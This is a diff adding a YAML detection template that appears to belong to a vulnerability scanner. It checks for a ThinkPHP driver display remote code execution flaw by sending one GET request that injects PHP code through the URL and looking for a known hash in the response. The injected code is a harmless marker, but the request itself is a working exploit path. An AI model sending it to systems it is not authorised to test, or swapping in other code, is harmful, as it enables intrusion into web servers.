@@ -1,0 +1,16 @@
+id: poc-yaml-thinkphp-driver-display-rce
+info:
+  name: ThinkPHP Driver Display RCE 漏洞
+  severity: high
+  tags:
+  - rce
+  finger: ThinkPHP
+  osprey-id: vb_2019_0070
+requests:
+- method: GET
+  path: /index.php?s=index/\think\view\driver\Php/display&content=<?php var_dump(md5(2333));?>
+  expression: 'contains(body, "56540676a129760a")
+
+    '
+variables: {}
+transport: http
